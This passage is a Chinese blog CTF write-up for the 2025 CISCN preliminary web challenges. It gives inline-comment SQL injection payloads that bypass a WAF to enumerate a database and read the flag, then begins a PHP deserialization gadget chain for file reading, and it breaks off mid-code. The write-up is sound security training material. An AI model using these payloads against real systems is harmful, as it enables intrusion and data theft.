@@ -1,0 +1,1131 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=" web AI_WAF 测试sql发现被waf\nfuzz发现过滤了这么多，但是加上NexaData后waf变少了，or竟然可以用了\n">
+<title>2025-ciscn初赛</title>
+
+<link rel='canonical' href='https://luo-kaihong.github.io/p/2025-ciscn%E5%88%9D%E8%B5%9B/'>
+
+<link rel="stylesheet" href="/scss/style.min.6a692fd055deae459f2a9767f57f3855ba80cafd5041317f24f7360f6ca47cdf.css"><meta property='og:title' content="2025-ciscn初赛">
+<meta property='og:description' content=" web AI_WAF 测试sql发现被waf\nfuzz发现过滤了这么多，但是加上NexaData后waf变少了，or竟然可以用了\n">
+<meta property='og:url' content='https://luo-kaihong.github.io/p/2025-ciscn%E5%88%9D%E8%B5%9B/'>
+<meta property='og:site_name' content='zhizuijimi'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='emo' /><meta property='article:published_time' content='2025-12-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-12-28T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="2025-ciscn初赛">
+<meta name="twitter:description" content=" web AI_WAF 测试sql发现被waf\nfuzz发现过滤了这么多，但是加上NexaData后waf变少了，or竟然可以用了\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_a4e3a2ed64404d6b.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">💗</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">zhizuijimi</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://mpbeta.csdn.net/mp_blog/manage/article?spm=1011.2124.3001.10336'
+                        target="_blank"
+                        title="csdn"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0" ?><!DOCTYPE svg  PUBLIC '-//W3C//DTD SVG 1.1//EN'  'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><svg enable-background="new 0 0 156.457 156.457" height="156.457" id="Layer_1" overflow="visible" version="1.1" viewBox="0 0 156.457 156.457" width="156.457" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><g id="icon"><circle cx="78.229" cy="78.229" fill="#EF7A2B" r="78.229"/><path d="M64.616,117.315c-9.653-0.584-16.453-4.751-19.793-12.154c-1.493-3.292-2.118-6.459-2.153-10.876   c-0.021-2.306,0.403-27.915,0.549-33.193c0.146-5.563,1.188-9.532,3.424-13.019c3.174-4.969,7.667-7.785,14.265-8.879   c2.542-0.424,24.8-0.875,26.96-0.521c5.001,0.827,8.932,2.858,12.224,6.306c2.694,2.823,4.444,6.236,5.257,10.271   c0.563,2.816,0.625,9.584,0.104,12.345c-0.194,0.983-0.223,1.386-0.104,1.386c0.091,0,0.868,0.066,1.716,0.149   c3.403,0.319,5.966,1.132,7.91,2.503c3.396,2.389,5,5.661,5.368,10.928c0.223,3.098,0.181,11.348-0.055,13.293   c-0.792,6.25-2.952,10.979-6.765,14.778c-3.577,3.57-7.737,5.57-13.522,6.501c-1.306,0.208-3.326,0.236-17.467,0.264   C73.735,117.412,65.672,117.371,64.616,117.315L64.616,117.315L64.616,117.315z M99.202,99.036   c1.285-0.334,2.153-0.819,3.091-1.765c2.188-2.194,2.632-5.319,1.16-8.209c-0.417-0.813-1.64-2.027-2.584-2.556   c-1.659-0.931-0.902-0.889-19.335-0.889c-14.862,0-16.786,0.021-17.612,0.223c-3.07,0.757-5.139,3.417-5.139,6.598   c0,1.938,0.66,3.535,2.021,4.868c0.931,0.91,1.632,1.326,2.896,1.688c0.785,0.229,2.097,0.25,17.745,0.264   C96.376,99.258,98.438,99.237,99.202,99.036L99.202,99.036z M85.841,67.988c0.444-0.167,1.139-0.552,1.541-0.854   c4.438-3.333,3.334-10.125-1.958-12.008c-0.569-0.205-1.515-0.267-5.376-0.368c-8.25-0.208-13.695-0.188-14.445,0.052   c-1.194,0.385-2.167,0.972-2.965,1.785c-3.57,3.615-2.167,9.55,2.667,11.275c0.729,0.264,1.34,0.302,6.424,0.417   C83.465,68.551,84.382,68.533,85.841,67.988L85.841,67.988L85.841,67.988z" fill="#FFFFFF"/></g></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#ai_waf">AI_WAF</a>
+      <ol>
+        <li><a href="#解法二内联注释绕过">解法二：内联注释绕过</a></li>
+      </ol>
+    </li>
+    <li><a href="#hellogate">hellogate</a></li>
+    <li><a href="#dedecms">dedecms</a></li>
+    <li><a href="#ezjava">EzJava</a>
+      <ol>
+        <li><a href="#考点thymeleaf渲染之读文件">考点：Thymeleaf渲染之读文件</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/web/" style="background-color: #ff0000; color: #fff;">
+                web
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/2025-ciscn%E5%88%9D%E8%B5%9B/">2025-ciscn初赛</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2025-12-28</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 2 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<h1 id="web">web
+</h1><h2 id="ai_waf">AI_WAF
+</h2><p>测试sql发现被waf</p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130410881.png"
+	width="1705"
+	height="312"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130410881_hu_b403277452227324.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130410881_hu_7482a2bcb32ea1f6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228130410881"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="546"
+		data-flex-basis="1311px"
+	
+></p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228103529534.png"
+	width="574"
+	height="286"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228103529534_hu_1e38e5b054e1b70f.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228103529534_hu_e484e9276285b507.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228103529534"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="200"
+		data-flex-basis="481px"
+	
+></p>
+<p>fuzz发现过滤了这么多，但是加上NexaData后waf变少了，or竟然可以用了</p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130332436.png"
+	width="1721"
+	height="313"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130332436_hu_6c87859dfd6b3db8.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130332436_hu_e79ea18efff93209.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228130332436"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="549"
+		data-flex-basis="1319px"
+	
+></p>
+<p>那就多用点NexaData，waf被去除，剩下的就是联合注入</p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228125209169.png"
+	width="1844"
+	height="326"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228125209169_hu_8b2f19fff2f93304.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228125209169_hu_db9baebd5a0c7ed6.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228125209169"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="565"
+		data-flex-basis="1357px"
+	
+></p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228125724461.png"
+	width="1814"
+	height="392"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228125724461_hu_f58a2a3238a9dee7.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228125724461_hu_d7d362eb1905e5b4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228125724461"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="462"
+		data-flex-basis="1110px"
+	
+></p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130031764.png"
+	width="1853"
+	height="437"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130031764_hu_6c97a06db0aa585c.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130031764_hu_3f56d840ccfef554.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228130031764"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="424"
+		data-flex-basis="1017px"
+	
+></p>
+<p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130146901.png"
+	width="1837"
+	height="384"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130146901_hu_a497dc885215cd8c.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228130146901_hu_2290e4f0d28c5d9e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228130146901"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="478"
+		data-flex-basis="1148px"
+	
+></p>
+<h3 id="解法二内联注释绕过">解法二：内联注释绕过
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39; /*!50000union*/ /*!50000select*/ 1,2,/*!50003*/schema_name/*!50003*/from/*!50003*/information_schema.schemata#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182925261.png"
+	width="1809"
+	height="362"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182925261_hu_7f4fc679b7748d26.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182925261_hu_f26190fee2cd4466.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228182925261"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="499"
+		data-flex-basis="1199px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39;/*!50000union*//*!50000select*/1,2,/*!50003*/table_name/*!50000from*/information_schema.tables/*!50000where*/table_schema=&#39;nexadata&#39;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182756818.png"
+	width="1786"
+	height="322"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182756818_hu_5ffb5f9fd19f7a82.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182756818_hu_7d35a9ffd8a9a22d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228182756818"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="554"
+		data-flex-basis="1331px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39;/*!50000union*//*!50000select*/1,2,/*!50003*/column_name/*!50000from*/information_schema.columns/*!50000where*/table_name=&#39;where_is_my_flagggggg&#39;#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182435818.png"
+	width="1790"
+	height="341"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182435818_hu_2d90f3b092b4c247.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182435818_hu_fd2d4221179d784a.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228182435818"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="524"
+		data-flex-basis="1259px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">-1&#39; /*!50000union*/ /*!50000select*/ 1,2,Th15_ls_f149  from where_is_my_flagggggg#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182453144.png"
+	width="1683"
+	height="334"
+	srcset="/p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182453144_hu_4e727ef9c5f5f417.png 480w, /p/2025-ciscn%E5%88%9D%E8%B5%9B/image-20251228182453144_hu_c35efc639bb143d2.png 1024w"
+	loading="lazy"
+	
+		alt="image-20251228182453144"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="503"
+		data-flex-basis="1209px"
+	
+></p>
+<h2 id="hellogate">hellogate
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$handle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">triggerMethod</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$worker</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">worker</span><span class="o">-&gt;</span><span class="na">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">C</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$cmd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$raw</span> <span class="o">=</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">header</span><span class="p">(</span><span class="s1">&#39;Content-Type: image/jpeg&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">readfile</span><span class="p">(</span><span class="s2">&#34;muzujijiji.jpg&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$obj</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$obj</span><span class="o">-&gt;</span><span class="na">triggerMethod</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">A</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$handle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="nf">triggerMethod</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&#34;</span> <span class="o">.</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">handle</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">B</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
